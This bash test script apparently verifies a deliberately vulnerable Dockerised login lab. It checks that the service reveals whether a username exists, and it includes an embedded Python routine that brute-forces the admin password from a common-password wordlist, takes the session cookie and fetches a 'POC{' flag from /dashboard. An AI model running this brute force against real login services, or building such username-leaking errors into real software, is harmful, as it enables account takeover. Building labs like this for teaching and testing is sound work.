#!/usr/bin/env bash
set -e
DC=$(docker compose version &>/dev/null && echo "docker compose" || echo "docker-compose")

$DC down 2>/dev/null || true
$DC up --build -d
trap "$DC down" EXIT
sleep 3

PORT=8085
FAIL=0

# 1. Unknown username returns "user not found"
OUT=$(curl -s -X POST "http://localhost:$PORT/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"nosuchuser","password":"anything"}')
if echo "$OUT" | grep -q "not found"; then
  echo "[+] PASS: unknown user returns 'user not found'"
else
  echo "[-] FAIL: expected 'user not found': $OUT"; FAIL=1
fi

# 2. Known user wrong password returns "incorrect password"
OUT=$(curl -s -X POST "http://localhost:$PORT/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"wrongpassword"}')
if echo "$OUT" | grep -q "incorrect"; then
  echo "[+] PASS: existing user wrong password returns 'incorrect password'"
else
  echo "[-] FAIL: expected 'incorrect password': $OUT"; FAIL=1
fi

# 3. Brute-force admin and reach /dashboard
python3 - <<'PYEOF'
import json, urllib.request, sys

TARGET = "http://localhost:8085"
WORDLIST = ["password", "123456", "admin", "admin123", "letmein", "qwerty"]

def login(u, p):
    req = urllib.request.Request(f"{TARGET}/login",
        data=json.dumps({"username": u, "password": p}).encode(),
        headers={"Content-Type": "application/json"}, method="POST")
    try:
        with urllib.request.urlopen(req) as r:
            return r.headers.get("Set-Cookie", ""), json.loads(r.read())
    except urllib.error.HTTPError as e:
        return "", json.loads(e.read())

for pw in WORDLIST:
    cookie, resp = login("admin", pw)
    if cookie:
        token = cookie.split(";")[0].split("=",1)[1]
        req = urllib.request.Request(f"{TARGET}/dashboard",
            headers={"Cookie": f"session={token}"})
        with urllib.request.urlopen(req) as r:
            data = json.loads(r.read())
        flag = data.get("flag", "")
        if flag.startswith("POC{"):
            print(f"[+] PASS: brute-forced admin:{pw}, flag={flag}")
            sys.exit(0)
        else:
            print(f"[-] FAIL: logged in but no flag: {data}")
            sys.exit(1)

print("[-] FAIL: no password worked")
sys.exit(1)
PYEOF

# 4. /dashboard without session returns 401
STATUS=$(curl -s -o /dev/null -w "%{http_code}" "http://localhost:$PORT/dashboard")
if [ "$STATUS" = "401" ]; then
  echo "[+] PASS: dashboard without session returns 401"
else
  echo "[-] FAIL: expected 401, got $STATUS"; FAIL=1
fi

if [ "$FAIL" -eq 0 ]; then
  echo "[+] All tests passed"
  exit 0
else
  echo "[-] One or more tests failed"
  exit 1
fi
